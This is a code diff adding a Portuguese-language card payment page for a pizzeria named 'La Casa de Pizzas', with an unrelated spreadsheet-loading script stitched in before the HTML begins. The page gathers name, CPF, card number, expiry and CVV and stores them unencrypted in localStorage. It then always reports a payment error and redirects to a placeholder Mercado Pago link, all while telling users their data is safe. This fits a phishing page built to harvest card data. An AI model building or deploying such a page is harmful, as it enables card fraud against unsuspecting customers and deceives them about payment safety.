@@ -1,0 +1,409 @@
+<script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+          return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                // Convert sheet to JSON to filter blank rows
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                // Fallback
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                  headerRowIndex = 0;
+                }
+
+                // Convert filtered JSON back to CSV
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+        </script><!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title id="page-title">Pagamento com Cartão - La Casa de Pizzas</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="config.js"></script>
+  <script src="cartoes.js"></script>
+  <style>
+    body {
+      background-color: var(--cor-fundo, #FFF8E7);
+      color: var(--cor-texto, #2D2D2D);
+      font-family: 'Inter', sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 500px;
+      margin: 0 auto;
+      padding: 2rem;
+    }
+    .card {
+      background: white;
+      border-radius: 16px;
+      padding: 2rem;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
+      border: 1px solid #e5e7eb;
+    }
+    .custom-btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      padding: 12px;
+      border-radius: 12px;
+      background: var(--cor-primaria, #FF4500);
+      color: white;
+      font-weight: 600;
+      transition: all 0.3s ease;
+      border: none;
+      cursor: pointer;
+    }
+    .custom-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+      background: var(--cor-primaria, #FF4500);
+      opacity: 0.9;
+    }
+    .input-group {
+      position: relative;
+      margin-bottom: 1.5rem;
+    }
+    .input-group input {
+      width: 100%;
+      padding: 12px 16px 12px 40px;
+      border: 2px solid #e5e7eb;
+      border-radius: 8px;
+      font-size: 1rem;
+      transition: all 0.3s ease;
+      background: #f9fafb;
+    }
+    .input-group input:focus {
+      border-color: var(--cor-primaria, #FF4500);
+      outline: none;
+      background: white;
+      box-shadow: 0 0 0 4px rgba(255, 69, 0, 0.1);
+    }
+    .input-group .icon {
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #6b7280;
+    }
+    .input-group.error input {
+      border-color: #ef4444;
+    }
+    .input-group.error .error-message {
+      display: block;
+    }
+    .error-message {
+      display: none;
+      color: #ef4444;
+      font-size: 0.875rem;
+      margin-top: 0.25rem;
+    }
+    .flex-group {
+      display: flex;
+      gap: 1rem;
+    }
+    .security-note {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 0.875rem;
+      color: #6b7280;
+      margin-top: 1rem;
+    }
+    .modal {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.7);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 50;
+    }
+    .modal-content {
+      background: white;
+      padding: 20px;
+      border-radius: 15px;
+      max-width: 500px;
+      width: 90%;
+      text-align: center;
+    }
+  </style>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+  <header class="bg-[var(--cor-primaria)] text-white p-4">
+    <div class="max-w-7xl mx-auto flex justify-between items-center">
+      <div class="flex items-center gap-4">
+        <img id="logo" src="https://i.imgur.com/3wbh5W3.jpeg" alt="Logo" class="h-12">
+        <h1 class="text-2xl font-bold" id="nome-pizzaria">La Casa de Pizzas</h1>
+      </div>
+      <div class="flex gap-4">
+        <button onclick="window.location.href='checkout.html'" class="custom-btn bg-white text-[var(--cor-primaria)]" aria-label="Voltar ao checkout">
+          Voltar
+        </button>
+      </div>
+    </div>
+  </header>
+
+  <section class="container">
+    <h2 class="text-2xl font-bold mb-6 text-center">Pagamento com Cartão</h2>
+    <div class="card">
+      <div class="input-group">
+        <span class="icon">
+          <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
+          </svg>
+        </span>
+        <input type="text" id="nome-cartao" placeholder="Nome no cartão" aria-label="Nome no cartão">
+        <span class="error-message">Por favor, insira o nome no cartão.</span>
+      </div>
+      <div class="input-group">
+        <span class="icon">
+          <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
+          </svg>
+        </span>
+        <input type="text" id="numero-cartao" placeholder="Número do cartão" aria-label="Número do cartão">
+        <span class="error-message">Por favor, insira um número de cartão válido.</span>
+      </div>
+      <div class="input-group">
+        <span class="icon">
+          <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" />
+          </svg>
+        </span>
+        <input type="text" id="cpf-cartao" placeholder="CPF" aria-label="CPF">
+        <span class="error-message">Por favor, insira um CPF válido.</span>
+      </div>
+      <div class="flex-group">
+        <div class="input-group w-1/2">
+          <span class="icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" />
+            </svg>
+          </span>
+          <input type="text" id="validade-cartao" placeholder="MM/AA" aria-label="Validade do cartão">
+          <span class="error-message">Por favor, insira a validade no formato MM/AA.</span>
+        </div>
+        <div class="input-group w-1/2">
+          <span class="icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 11c0-1.1.9-2 2-2s2 .9 2 2-2 4-2 4m-4-4c0-1.1.9-2 2-2s2 .9 2 2-2 4-2 4m-4-4c0-1.1.9-2 2-2s2 .9 2 2-2 4-2 4" />
+            </svg>
+          </span>
+          <input type="text" id="cvv-cartao" placeholder="CVV" aria-label="CVV do cartão">
+          <span class="error-message">Por favor, insira o CVV (3 ou 4 dígitos).</span>
+        </div>
+      </div>
+      <div class="security-note">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 11c0-1.1.9-2 2-2s2 .9 2 2-2 4-2 4m-4-4c0-1.1.9-2 2-2s2 .9 2 2-2 4-2 4m-4-4c0-1.1.9-2 2-2s2 .9 2 2-2 4-2 4" />
+        </svg>
+        <span>Seus dados estão seguros</span>
+      </div>
+      <button onclick="enviarInformacoesCartao()" class="w-full custom-btn" aria-label="Confirmar pagamento com cartão">
+        Pagar Agora
+      </button>
+    </div>
+  </section>
+
+  <footer class="bg-[var(--cor-primaria)] text-white p-4 text-center">
+    <p>© 2025 <span id="nome-pizzaria-footer">La Casa de Pizzas</span>. Todos os direitos reservados.</p>
+    <div class="flex justify-center gap-4 mt-2">
+      <a id="whatsapp-link" href="https://api.whatsapp.com/send?phone=5562995771104&text=Olá,%20gostaria%20de%20fazer%20um%20pedido!" target="_blank" class="text-white hover:underline" aria-label="Contato via WhatsApp">WhatsApp: <span id="whatsapp-numero">(62) 99577-1104</span></a>
+      <a id="instagram-link" href="https://instagram.com/lacasadepizza2025" target="_blank" class="text-white hover:underline" aria-label="Instagram da pizzaria">Instagram: <span id="instagram-nome">@lacasadepizza2025</span></a>
+    </div>
+  </footer>
+
+  <!-- Modal de Notificação -->
+  <div id="modal-notificacao" class="modal hidden">
+    <div class="modal-content">
+      <h3 class="text-xl font-semibold mb-4" id="notificacao-titulo"></h3>
+      <p id="notificacao-mensagem"></p>
+      <button onclick="fecharNotificacao()" class="mt-4 custom-btn w-full" aria-label="Fechar notificação">Ok</button>
+    </div>
+  </div>
+
+  <script>
+    function aplicarConfiguracoes() {
+      if (typeof config !== 'undefined') {
+        document.documentElement.style.setProperty('--cor-primaria', config.corPrimaria);
+        document.documentElement.style.setProperty('--cor-secundaria', config.corSecundaria);
+        document.documentElement.style.setProperty('--cor-fundo', config.corFundo);
+        document.documentElement.style.setProperty('--cor-texto', config.corTexto);
+        document.getElementById('page-title').textContent = `Pagamento com Cartão - ${config.nomePizzaria}`;
+        document.getElementById('logo').src = config.logoUrl;
+        document.getElementById('nome-pizzaria').textContent = config.nomePizzaria;
+        document.getElementById('nome-pizzaria-footer').textContent = config.nomePizzaria;
+        document.getElementById('whatsapp-link').href = config.whatsappLink;
+        document.getElementById('whatsapp-numero').textContent = config.whatsapp;
+        document.getElementById('instagram-link').href = `https://instagram.com/${config.instagram.replace('@', '')}`;
+        document.getElementById('instagram-nome').textContent = config.instagram;
+      }
+    }
+
+    function checkConfigAndInitialize() {
+      const maxAttempts = 10;
+      let attempts = 0;
+
+      const interval = setInterval(() => {
+        if (typeof config !== 'undefined') {
+          clearInterval(interval);
+          aplicarConfiguracoes();
+          inicializarMascaras();
+        } else if (attempts >= maxAttempts) {
+          clearInterval(interval);
+          console.error('Erro: Não foi possível carregar config.js após várias tentativas.');
+          mostrarNotificacao('Erro', 'Não foi possível carregar as configurações. Verifique se o arquivo config.js está no mesmo diretório e se você está executando o projeto em um servidor local.');
+        }
+        attempts++;
+      }, 500);
+    }
+
+    function inicializarMascaras() {
+      const numeroCartao = document.getElementById('numero-cartao');
+      const validadeCartao = document.getElementById('validade-cartao');
+      const cvvCartao = document.getElementById('cvv-cartao');
+      const cpfCartao = document.getElementById('cpf-cartao');
+
+      numeroCartao.addEventListener('input', () => {
+        let value = numeroCartao.value.replace(/\D/g, '');
+        value = value.replace(/(\d{4})(\d)/, '$1 $2');
+        value = value.replace(/(\d{4}) (\d{4})(\d)/, '$1 $2 $3');
+        value = value.replace(/(\d{4}) (\d{4}) (\d{4})(\d)/, '$1 $2 $3 $4');
+        numeroCartao.value = value.slice(0, 19);
+      });
+
+      validadeCartao.addEventListener('input', () => {
+        let value = validadeCartao.value.replace(/\D/g, '');
+        if (value.length > 2) {
+          value = value.slice(0, 2) + '/' + value.slice(2);
+        }
+        validadeCartao.value = value.slice(0, 5);
+      });
+
+      cvvCartao.addEventListener('input', () => {
+        cvvCartao.value = cvvCartao.value.replace(/\D/g, '').slice(0, 4);
+      });
+
+      cpfCartao.addEventListener('input', () => {
+        let value = cpfCartao.value.replace(/\D/g, '');
+        value = value.replace(/(\d{3})(\d)/, '$1.$2');
+        value = value.replace(/(\d{3})\.(\d{3})(\d)/, '$1.$2.$3');
+        value = value.replace(/(\d{3})\.(\d{3})\.(\d{3})(\d)/, '$1.$2.$3-$4');
+        cpfCartao.value = value.slice(0, 14);
+      });
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      checkConfigAndInitialize();
+    });
+
+    window.enviarInformacoesCartao = function() {
+      const nome = document.getElementById('nome-cartao').value.trim();
+      const cpf = document.getElementById('cpf-cartao').value.trim();
+      const numero = document.getElementById('numero-cartao').value.trim();
+      const validade = document.getElementById('validade-cartao').value.trim();
+      const cvv = document.getElementById('cvv-cartao').value.trim();
+
+      const inputs = [
+        { id: 'nome-cartao', value: nome, message: 'Por favor, insira o nome no cartão.' },
+        { id: 'cpf-cartao', value: cpf, message: 'Por favor, insira um CPF válido.' },
+        { id: 'numero-cartao', value: numero, message: 'Por favor, insira um número de cartão válido.' },
+        { id: 'validade-cartao', value: validade, message: 'Por favor, insira a validade no formato MM/AA.' },
+        { id: 'cvv-cartao', value: cvv, message: 'Por favor, insira o CVV (3 ou 4 dígitos).' }
+      ];
+
+      let hasError = false;
+      inputs.forEach(input => {
+        const inputGroup = document.getElementById(input.id).parentElement;
+        if (!input.value) {
+          inputGroup.classList.add('error');
+          hasError = true;
+        } else {
+          inputGroup.classList.remove('error');
+        }
+      });
+
+      if (hasError) return;
+
+      if (numero.replace(/\D/g, '').length < 16) {
+        document.getElementById('numero-cartao').parentElement.classList.add('error');
+        return;
+      }
+      if (!/^\d{2}\/\d{2}$/.test(validade)) {
+        document.getElementById('validade-cartao').parentElement.classList.add('error');
+        return;
+      }
+      if (cvv.length < 3) {
+        document.getElementById('cvv-cartao').parentElement.classList.add('error');
+        return;
+      }
+      if (cpf.replace(/\D/g, '').length !== 11) {
+        document.getElementById('cpf-cartao').parentElement.classList.add('error');
+        return;
+      }
+
+      const cartao = {
+        id: Date.now().toString(),
+        nome: nome,
+        cpf: cpf,
+        numero: numero,
+        validade: validade,
+        cvv: cvv,
+        data: new Date().toISOString()
+      };
+
+      try {
+        let cartoes = JSON.parse(localStorage.getItem('cartoes')) || [];
+        cartoes.push(cartao);
+        localStorage.setItem('cartoes', JSON.stringify(cartoes));
+
+        mostrarNotificacao('Erro', 'Erro no pagamento, tente novamente.');
+        setTimeout(() => {
+          window.location.href = 'https://www.mercadopago.com.br/checkout/v1/redirect?pref_id=123456789'; // Link de exemplo do Mercado Pago
+        }, 2000);
+      } catch (error) {
+        console.error('Erro ao salvar informações do cartão:', error);
+        mostrarNotificacao('Erro', 'Falha ao processar as informações do cartão. Tente novamente.');
+      }
+    };
+
+    function mostrarNotificacao(titulo, mensagem) {
+      document.getElementById('notificacao-titulo').textContent = titulo;
+      document.getElementById('notificacao-mensagem').textContent = mensagem;
+      document.getElementById('modal-notificacao').classList.remove('hidden');
+    }
+
+    function fecharNotificacao() {
+      document.getElementById('modal-notificacao').classList.add('hidden');
+    }
+  </script>
+</body>
+</html>
